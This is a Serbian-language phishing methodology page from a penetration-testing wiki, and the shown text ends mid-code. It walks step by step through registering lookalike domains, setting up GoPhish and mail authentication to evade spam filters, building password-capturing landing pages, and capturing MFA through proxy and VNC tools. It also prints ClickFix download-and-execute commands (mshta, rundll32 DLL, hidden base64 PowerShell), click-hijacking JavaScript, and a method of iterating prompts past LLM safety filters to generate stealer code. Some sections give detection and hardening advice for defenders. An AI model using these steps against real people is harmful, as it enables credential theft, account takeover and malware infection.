# Metodologija phishinga

{{#include ../../banners/hacktricks-training.md}}

## Metodologija

1. Izviđanje žrtve
1. Izaberite **domen žrtve**.
2. Obavite osnovnu web enumeraciju **tražeći login portale** koje žrtva koristi i **odlučite** koji ćete **oponašati**.
3. Upotrebite **OSINT** da biste **pronašli email adrese**.
2. Priprema okruženja
1. **Kupite domen** koji ćete koristiti za phishing procenu
2. **Konfigurišite zapise povezane sa email servisom** (SPF, DMARC, DKIM, rDNS)
3. Konfigurišite VPS sa **gophish**
3. Priprema kampanje
1. Pripremite **email template**
2. Pripremite **web stranicu** za krađu kredencijala
4. Pokrenite kampanju!

## Generisanje sličnih naziva domena ili kupovina pouzdanog domena

### Tehnike varijacije naziva domena

- **Ključna reč**: Naziv domena **sadrži** važnu **ključnu reč** originalnog domena (npr., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdomen sa crticom**: Zamenite **tačku crticom** u subdomenu (npr., www-zelster.com).
- **Novi TLD**: Isti domen uz korišćenje **novog TLD-a** (npr., zelster.org)
- **Homoglif**: **Zamenjuje** slovo u nazivu domena **slovima koja izgledaju slično** (npr., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transpozicija:** Menja redosled dva slova **unutar naziva domena** (npr., zelsetr.com).
- **Jednina/množina**: Dodaje ili uklanja „s“ na kraju naziva domena (npr., zeltsers.com).
- **Izostavljanje**: **Uklanja jedno** od slova iz naziva domena (npr., zelser.com).
- **Ponavljanje:** **Ponavlja jedno** od slova u nazivu domena (npr., zeltsser.com).
- **Zamena**: Slično kao homoglif, ali je manje prikriveno. Zamenjuje jedno od slova u nazivu domena, možda slovom koje se na tastaturi nalazi blizu originalnog slova (npr., zektser.com).
- **Dodavanje subdomena**: Uvodi **tačku** unutar naziva domena (npr., ze.lster.com).
- **Umetanje**: **Umeće slovo** u naziv domena (npr., zerltser.com).
- **Nedostajuća tačka**: Dodaje TLD na naziv domena. (npr., zelstercom.com)

**Automatski alati**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Web sajtovi**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Postoji **mogućnost da se neki bitovi koji su uskladišteni ili se prenose automatski promene** zbog različitih faktora, kao što su solarne baklje, kosmičke zrake ili hardverske greške.

Kada se ovaj koncept **primeni na DNS zahteve**, moguće je da **domen koji primi DNS server** nije isti kao domen koji je prvobitno zatražen.

Na primer, izmena jednog bita u domenu „windows.com“ može ga promeniti u „windnws.com“.

Napadači mogu **iskoristiti ovo registrovanjem više bit-flipping domena** koji su slični domenu žrtve. Njihova namera je da preusmere legitimne korisnike na sopstvenu infrastrukturu.

Za više informacija pročitajte [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[9]](#references)</sup>

### Kupovina pouzdanog domena

Na [https://www.expireddomains.net/](https://www.expireddomains.net) možete potražiti istekli domen koji biste mogli da koristite.\
Da biste bili sigurni da domen sa isteklom registracijom koji ćete kupiti **već ima dobar SEO**, možete proveriti kako je kategorizovan na:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Pronalaženje email adresa

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% besplatno)
- [https://phonebook.cz/](https://phonebook.cz) (100% besplatno)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Da biste **pronašli više** važećih email adresa ili **verifikovali one** koje ste već pronašli, možete proveriti da li možete da ih brute-force-ujete na smtp serverima žrtve. [Ovde saznajte kako da verifikujete/pronađete email adresu](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Takođe, ne zaboravite da, ako korisnici koriste **bilo koji web portal za pristup emailovima**, možete proveriti da li je ranjiv na **username brute force** i iskoristiti ranjivost, ako je moguće.

## Konfigurisanje GoPhish-a

### Instalacija

Možete ga preuzeti sa [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Preuzmite ga i dekompresujte unutar `/opt/gophish`, a zatim izvršite `/opt/gophish/gophish`\
U izlazu ćete dobiti lozinku za admin korisnika na portu 3333. Zato pristupite tom portu i upotrebite te kredencijale da promenite admin lozinku. Možda ćete morati da tunelujete taj port na lokalni računar:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracija

**Konfiguracija TLS sertifikata**

Pre ovog koraka trebalo bi da ste **već kupili domen** koji ćete koristiti i on mora biti **usmeren** na **IP adresu VPS-a** na kojem konfigurišete **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracija maila**

Započnite instalaciju: `apt-get install postfix`

Zatim dodajte domen u sledeće fajlove:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

Takođe promenite vrednosti sledećih promenljivih unutar /etc/postfix/main.cf

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na kraju izmenite fajlove **`/etc/hostname`** i **`/etc/mailname`** tako da sadrže naziv vašeg domena i **restartujte VPS.**

Sada kreirajte **DNS A zapis** za `mail.<domain>` koji pokazuje na **IP adresu** VPS-a, kao i **DNS MX** zapis koji pokazuje na `mail.<domain>`

Sada testirajmo slanje imejla:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish konfiguracija**

Zaustavite izvršavanje gophish-a i konfigurišimo ga.\
Izmenite `/opt/gophish/config.json` na sledeći način (obratite pažnju na korišćenje https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigurisanje gophish servisa**

Da biste kreirali gophish servis kako bi mogao automatski da se pokreće i da se njime upravlja kao servisom, možete kreirati fajl `/etc/init.d/gophish` sa sledećim sadržajem:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Završite konfigurisanje servisa i proverite ga tako što ćete:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurisanje mail servera i domena

### Sačekajte i budite legitimni

Što je domen stariji, manja je verovatnoća da će biti uhvaćen kao spam. Zato treba da sačekate što je moguće duže (najmanje 1 nedelju) pre phishing procene. Štaviše, ako postavite stranicu o sektoru sa dobrom reputacijom, stečena reputacija će biti bolja.

Imajte na umu da, čak i ako morate da sačekate nedelju dana, sve možete da konfigurišete već sada.

### Konfigurisanje Reverse DNS (rDNS) zapisa

Postavite rDNS (PTR) zapis koji razrešava IP adresu VPS-a na naziv domena.

### Sender Policy Framework (SPF) zapis

Morate **konfigurisati SPF zapis za novi domen**. Ako ne znate šta je SPF zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Možete koristiti [https://www.spfwizard.net/](https://www.spfwizard.net) za generisanje SPF policy-ja (koristite IP adresu VPS mašine)

![SPF Wizard obrazac za generisanje SPF zapisa za phishing domen](<../../images/image (1037).png>)

Ovo je sadržaj koji mora biti postavljen unutar TXT zapisa u domenu:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) zapis

Morate **konfigurisati DMARC zapis za novi domen**. Ako ne znate šta je DMARC zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Morate kreirati novi DNS TXT zapis koji pokazuje na hostname `_dmarc.<domain>`, sa sledećim sadržajem:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Morate **konfigurisati DKIM za novi domen**. Ako ne znate šta je DMARC record, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ovaj tutorijal je zasnovan na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>

> [!TIP]
> Potrebno je da spojite obe B64 vrednosti koje DKIM key generiše:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testirajte ocenu konfiguracije emaila

To možete uraditi pomoću [https://www.mail-tester.com/](https://www.mail-tester.com)\
Samo otvorite stranicu i pošaljite email na adresu koju vam daju:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Takođe možete **proveriti konfiguraciju e-pošte** slanjem e-pošte na `check-auth@verifier.port25.com` i **čitanjem odgovora** (za ovo ćete morati da **otvorite** port **25** i vidite odgovor u datoteci _/var/mail/root_ ako e-poštu pošaljete kao root).\
Proverite da li prolazite sve testove:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Možete takođe poslati **poruku na Gmail nalog pod vašom kontrolom** i proveriti **zaglavlja emaila** u Gmail prijemnom sandučetu; `dkim=pass` bi trebalo da bude prisutno u polju zaglavlja `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Uklanjanje sa Spamhaus crne liste

Stranica [www.mail-tester.com](https://www.mail-tester.com) može da vam pokaže da li Spamhaus blokira vaš domen. Možete zatražiti uklanjanje svog domena/IP adrese na: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Uklanjanje sa Microsoft crne liste

​​Možete zatražiti uklanjanje svog domena/IP adrese na [https://sender.office.com/](https://sender.office.com).

## Kreiranje i pokretanje GoPhish Campaign

### Sending Profile

- Postavite neko **ime za identifikaciju** sender profila
- Odlučite sa kog naloga ćete slati phishing emailove. Predlozi: _noreply, support, servicedesk, salesforce..._
- Username i password možete ostaviti praznim, ali obavezno označite Ignore Certificate Errors

![Kreiranje i pokretanje GoPhish Campaign - Sending Profile: Username i password možete ostaviti praznim, ali obavezno označite Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Preporučuje se da koristite funkcionalnost "**Send Test Email**" kako biste proverili da li sve funkcioniše.\
> Preporučujem da **test emailove pošaljete na 10min mail adrese** kako biste izbegli da budete stavljeni na crnu listu tokom testiranja.

### Email Template

- Postavite neko **ime za identifikaciju** template-a
- Zatim napišite **subject** (ništa neobično, samo nešto što biste očekivali da pročitate u regularnom emailu)
- Proverite da li je označeno "**Add Tracking Image**"
- Napišite **email template** (možete koristiti promenljive kao u sledećem primeru):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Imajte na umu da se **radi povećanja kredibiliteta emaila** preporučuje korišćenje nekog potpisa iz emaila klijenta. Predlozi:

- Pošaljite email na **nepostojeću adresu** i proverite da li odgovor sadrži potpis.
- Pronađite **javne email adrese** kao što su info@ex.com, press@ex.com ili public@ex.com, pošaljite im email i sačekajte odgovor.
- Pokušajte da kontaktirate **neku otkrivenu validnu** email adresu i sačekajte odgovor

![Sending Profile - Email Template: Pokušajte da kontaktirate neku otkrivenu validnu email adresu i sačekajte odgovor](<../../images/image (80).png>)

> [!TIP]
> Email Template takođe omogućava **dodavanje fajlova za slanje**. Ako biste takođe želeli da ukradete NTLM izazove pomoću posebno kreiranih fajlova/dokumenata, [pročitajte ovu stranicu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Unesite **ime**
- **Napišite HTML kod** web stranice. Imajte na umu da možete **uvesti** web stranice.
- Označite **Capture Submitted Data** i **Capture Passwords**
- Podesite **redirekciju**

![Email Template - Landing Page: Označite Capture Submitted Data i Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Obično ćete morati da izmenite HTML kod stranice i obavite nekoliko testova lokalno (možda pomoću nekog Apache servera) **dok ne budete zadovoljni rezultatima.** Zatim upišite taj HTML kod u polje.\
> Imajte na umu da, ako za HTML treba da **koristite neke statičke resurse** (možda neke CSS i JS stranice), možete da ih sačuvate u _**/opt/gophish/static/endpoint**_ i zatim im pristupite preko _**/static/\<filename>**_

> [!TIP]
> Za redirekciju možete **preusmeriti korisnike na legitimnu glavnu web stranicu** žrtve ili ih, na primer, preusmeriti na _/static/migration.html_, prikazati neki **točak za učitavanje (**[**https://loading.io/**](https://loading.io)**) tokom 5 sekundi i zatim prikazati da je proces uspešno završen**.

### Users & Groups

- Podesite ime
- **Uvezite podatke** (imajte na umu da su za korišćenje template-a u ovom primeru potrebni ime, prezime i email adresa svakog korisnika)

![Landing Page - Users & Groups: Uvezite podatke (imajte na umu da su za korišćenje template-a u ovom primeru potrebni ime, prezime i email adresa svakog korisnika)](<../../images/image (163).png>)

### Campaign

Na kraju kreirajte campaign izborom imena, email template-a, landing page-a, URL-a, sending profile-a i grupe. Imajte na umu da će URL biti link poslat žrtvama.

Imajte na umu da **Sending Profile omogućava slanje test emaila kako biste videli kako će izgledati konačni phishing email**:

![Users & Groups - Campaign: Imajte na umu da Sending Profile omogućava slanje test emaila kako biste videli kako će izgledati konačni phishing email](<../../images/image (192).png>)

> [!TIP]
> Preporučujem da **test emailove šaljete na 10min mail adrese** kako biste izbegli stavljanje na blacklistu tokom testiranja.

Kada je sve spremno, samo pokrenite campaign!

## Website Cloning

Ako iz bilo kog razloga želite da klonirate web stranicu, pogledajte sledeću stranicu:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

U nekim phishing procenama (uglavnom za Red Teams) želećete da takođe **pošaljete fajlove koji sadrže neku vrstu backdoor-a** (možda C2 ili samo nešto što će pokrenuti authentication).\
Pogledajte sledeću stranicu za nekoliko primera:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Prethodni napad je prilično dovitljiv jer lažirate pravu web stranicu i prikupljate informacije koje korisnik unese. Nažalost, ako korisnik nije uneo ispravnu lozinku ili ako je aplikacija koju ste lažirali podešena sa 2FA, **ove informacije vam neće omogućiti da se predstavljate kao prevareni korisnik**.

Ovde su korisni alati kao što su [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovaj alat vam omogućava da generišete napad nalik MitM napadu. Napad u osnovi funkcioniše na sledeći način:

1. **Oponašate login** formu prave web stranice.
2. Korisnik **šalje** svoje **credentials** vašoj lažnoj stranici, a alat ih šalje pravoj web stranici, **proveravajući da li credentials funkcionišu**.
3. Ako je nalog podešen sa **2FA**, MitM stranica će zatražiti 2FA, a kada ga **korisnik unese**, alat će ga poslati pravoj web stranici.
4. Kada se korisnik autentifikuje, vi ćete (kao napadač) imati **uhvaćene credentials, 2FA, cookie i sve informacije** iz svake interakcije tokom koje alat obavlja MitM.

### Via VNC

Šta ako umesto da **pošaljete žrtvu na zlonamernu stranicu** koja izgleda isto kao originalna, pošaljete žrtvu na **VNC sesiju sa browserom povezanim na pravu web stranicu**? Moći ćete da vidite šta radi, ukradete lozinku, korišćeni MFA, cookies...\
To možete uraditi pomoću [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup>

## Detecting the detection

Očigledno je jedan od najboljih načina da saznate da li ste otkriveni da **pretražite svoj domen u blacklistama**. Ako se pojavljuje na listi, vaš domen je na neki način označen kao sumnjiv.\
Jedan jednostavan način da proverite da li se vaš domen pojavljuje na nekoj blacklisti jeste korišćenje [https://malwareworld.com/](https://malwareworld.com)

Međutim, postoje i drugi načini da saznate da li žrtva **aktivno traži sumnjive phishing aktivnosti u internetu**, kao što je objašnjeno na:


{{#ref}}
detecting-phising.md
{{#endref}}

Možete **kupiti domen sa veoma sličnim imenom** domenu žrtve **i/ili generisati certificate** za **subdomain** domena koji kontrolišete, a koji **sadrži** **keyword** domena žrtve. Ako **žrtva** obavi bilo kakvu **DNS ili HTTP interakciju** sa njima, znaćete da **aktivno traži** sumnjive domene i moraćete da budete veoma prikriveni.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Koristite [**Phishious** ](https://github.com/Rices/Phishious)da procenite da li će vaš email završiti u spam folderu ili će biti blokiran ili uspešan.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Savremene intrusion sets sve češće u potpunosti preskaču email mamce i **direktno ciljaju service-desk / identity-recovery workflow** kako bi zaobišle MFA. Napad se u potpunosti oslanja na "living-off-the-land": čim operator preuzme validne credentials, prelazi na druge sisteme pomoću ugrađenih admin alata – malware nije potreban.<sup>[[5]](#references)</sup>

### Attack flow
1. Izvršite reconnaissance žrtve
* Prikupite lične i korporativne podatke sa LinkedIn-a, iz data breach-eva, javnog GitHub-a itd.
* Identifikujte identitete visoke vrednosti (rukovodioci, IT, finansije) i utvrdite **tačan help-desk proces** za reset lozinke / MFA.
2. Social engineering u realnom vremenu
* Pozovite help-desk telefonom, preko Teams-a ili chata, predstavljajući se kao meta (često uz **spoofed caller-ID** ili **cloned voice**).
* Dostavite prethodno prikupljene PII podatke kako biste prošli verifikaciju zasnovanu na znanju.
* Ubedite operatera da **resetuje MFA secret** ili izvrši **SIM-swap** na registrovanom mobilnom broju.
3. Neposredne radnje nakon pristupa (≤60 min u stvarnim slučajevima)
* Uspostavite foothold preko bilo kog web SSO portala.
* Izvršite enumeraciju AD / AzureAD pomoću ugrađenih alata (bez ubacivanja binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Izvršite lateral movement pomoću **WMI**, **PsExec** ili legitimnih **RMM** agenata koji su već na whitelisti u okruženju.

### Detection & Mitigation
* Tretirajte help-desk identity recovery kao **privileged operation** – zahtevajte step-up auth i odobrenje managera.
* Uvedite pravila **Identity Threat Detection & Response (ITDR)** / **UEBA** koja generišu upozorenja za:
* Promenjen MFA metod + authentication sa novog uređaja / geo-lokacije.
* Neposredno povećanje privilegija istog principal-a (user-→-admin).
* Snimajte help-desk pozive i zahtevajte **poziv na već registrovani broj** pre bilo kakvog reseta.
* Implementirajte **Just-In-Time (JIT) / Privileged Access** kako novoresetovani nalozi ne bi automatski nasledili tokene sa visokim privilegijama.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews nadoknađuju troškove high-touch operacija masovnim napadima koji **pretvaraju search engines i ad networks u kanal za isporuku**.<sup>[[5]](#references)</sup>

1. **SEO poisoning / malvertising** gura lažni rezultat kao što je `chromium-update[.]site` na vrh search oglasa.
2. Žrtva preuzima mali **first-stage loader** (često JS/HTA/ISO). Primeri koje je uočio Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader izbacuje browser cookies + credential DBs, a zatim preuzima **silent loader** koji – *u realnom vremenu* – odlučuje da li će instalirati:
* RAT (npr. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence komponentu (registry Run key + scheduled task)

### Hardening tips
* Blokirajte novoregistrovane domene i primenite **Advanced DNS / URL Filtering** i na *search-ads*, kao i na email.
* Ograničite instalaciju software-a na potpisane MSI / Store pakete, a izvršavanje `HTA`, `ISO`, `VBS` fajlova zabranite pravilima.
* Nadgledajte child procese browsera koji otvaraju installere:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Tražite LOLBins koje first-stage loaderi često zloupotrebljavaju (npr. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Neki lažni software portali ostavljaju vidljivi download `href` koji pokazuje na **pravi GitHub/release URL**, ali pomoću JavaScript-a preuzimaju kontrolu nad **prvom** interakcijom korisnika i umesto toga šalju žrtvu kroz lanac **Traffic Distribution System (TDS)**.<sup>[[8]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Ključne karakteristike:
- Hook se obično izvršava u **capture fazi** (`true`) na objektu `document`, tako da se aktivira pre handlera sajta.
- Chrome često koristi `mousedown` umesto `click` kako bi preusmeravanje ostalo povezano sa validnim **korisničkim gestom** i poboljšalo zaobilaženje popup blokera.
- Neke varijante unapred otvaraju `about:blank` ili simuliraju klikove na `<a target="_blank">` elementima, a URL za TDS dodeljuju tek kasnije.
- Ograničenja na strani browsera često se čuvaju u `localStorage`, pa **prvi klik** može odvesti do malware-a, dok se osvežavanja/ponovni pokušaji vraćaju na bezopasni link koji izgleda legitimno.
- TDS može da filtrira na osnovu referrera, ulaznog domena, GEO lokacije, fingerprinta browsera/uređaja, provera VPN/datacentar opsega, konteksta klika i brojača po sesiji, zbog čega ponovljena pokretanja analitičara mogu biti nedeterministička.

Ideje za odbranu:
- Uporedite **prikazani** `href` sa **stvarnim** odredištem navigacije koje se generiše u trenutku klika.
- Tražite `document.addEventListener(..., true)` handlere koji pozivaju i `preventDefault()` i `stopImmediatePropagation()` u vezi sa `window.open`, `about:blank` ili simuliranim klikovima na anchor elementima.
- Grupe novoregistrovanih domena za preuzimanje softvera koji svi učitavaju isti CloudFront/JS stage tretirajte kao obrazac visokog nivoa indikativnosti za SEO-poisoning/TDS.

### ClickFix sa lažnih stranica za verifikaciju + LOLBAS fetch-ovi koji izgledaju kao arhive
Neke TDS grane završavaju na lažnoj stranici za verifikaciju (u stilu Cloudflare/IUAM) koja žrtvi nalaže da pokrene pouzdani Windows binary, kao što je:<sup>[[8]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Napomene:
- `mshta.exe` izvršava **HTA/VBScript na početku odgovora**, čak i ako se URL predstavlja kao `.7z` arhiva; dodati podaci arhive mogu biti čista varka.
- Naredne faze često nastavljaju da lažno prikazuju tip datoteke (`.rtf` za PowerShell, `.asar` za Python, ZIP arhive sa binarnim datotekama dopunjenim podacima), a zatim prelaze na **ručno mapiranje PE-a / izvršavanje u memoriji**.
- Ako odgovarate na jedan od ovih lanaca, sačuvajte **mrežu + memoriju od prvog uspešnog pokretanja**: kasnija ponavljanja mogu prikazati samo benignu putanju instalera/SFX-a ili neuspeti zato što su payload/ključ za oslobađanje bili vezani za originalnu TDS sesiju.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Mamac: klonirano nacionalno CERT obaveštenje sa dugmetom **Update** koje prikazuje detaljna uputstva za „otklanjanje problema“. Žrtvama se nalaže da pokrenu batch koji preuzima DLL i izvršava ga pomoću `rundll32`.<sup>[[8]](#references)</sup>
* Uobičajeni batch lanac:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` spušta payload u `%TEMP%`, kratko čekanje prikriva mrežni jitter, a zatim `rundll32` poziva eksportovanu ulaznu tačku (`notepad`).
* DLL šalje identitet hosta i proverava C2 svakih nekoliko minuta. Udaljeni tasking stiže kao **base64-enkodovani PowerShell** koji se izvršava skriveno i uz zaobilaženje policy-ja:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Ovo zadržava fleksibilnost C2-a (server može da menja taskove bez ažuriranja DLL-a) i skriva konzolne prozore. Tražite PowerShell procese-potomke `rundll32.exe` koji zajedno koriste `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Defenders mogu tražiti HTTP(S) callback zahteve u obliku `...page.php?tynor=<COMPUTER>sss<USER>` i intervale polling-a od 5 minuta nakon učitavanja DLL-a.

---

## AI-enhanced Phishing Operations
Napadači sada povezuju **LLM i voice-clone API-je** za potpuno personalizovane mamce i interakciju u realnom vremenu.

| Sloj | Primer upotrebe od strane threat actor-a |
|-------|-------------|
|Automation|Generisanje i slanje >100 k emailova / SMS poruka sa randomizovanim tekstom i tracking linkovima.|
|Generative AI|Kreiranje *jednokratnih* emailova koji se pozivaju na javne M&A događaje i interne šale sa društvenih mreža; deep-fake glas CEO-a u callback prevari.|
|Agentic AI|Autonomna registracija domena, prikupljanje open-source intel podataka i sastavljanje narednih emailova kada žrtva klikne, ali ne pošalje kredencijale.|

**Defence:**
• Dodajte **dinamičke banere** koji ističu poruke poslate iz nepouzdanе Automation infrastrukture (putem ARC/DKIM anomalija).
• Uvedite **voice-biometric challenge fraze** za telefonske zahteve visokog rizika.
• Kontinuirano simulirajte AI-generisane mamce u programima podizanja svesti – statični template-i su zastareli.

Pogledajte takođe – zloupotrebu agentic browsing-a za phishing kredencijala:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Pogledajte takođe – zloupotrebu AI agent-a za lokalne CLI alate i MCP (za inventarizaciju secrets podataka i detekciju):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Napadači mogu isporučiti HTML koji izgleda benigno i **generisati steal-er tokom izvršavanja** tako što od **trusted LLM API-ja** zatraže JavaScript, a zatim ga izvrše u browser-u (npr. `eval` ili dinamički `<script>`).<sup>[[7]](#references)</sup>

1. **Prompt-as-obfuscation:** kodirajte exfil URL-ove/Base64 stringove u promptu; iterirajte tekst da biste zaobišli safety filtere i smanjili hallucinations.
2. **Client-side API call:** pri učitavanju, JS poziva javni LLM (Gemini/DeepSeek/etc.) ili CDN proxy; u statičkom HTML-u prisutni su samo prompt/API poziv.
3. **Assemble & exec:** konkatenirajte odgovor i izvršite ga (polimorfno pri svakoj poseti):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
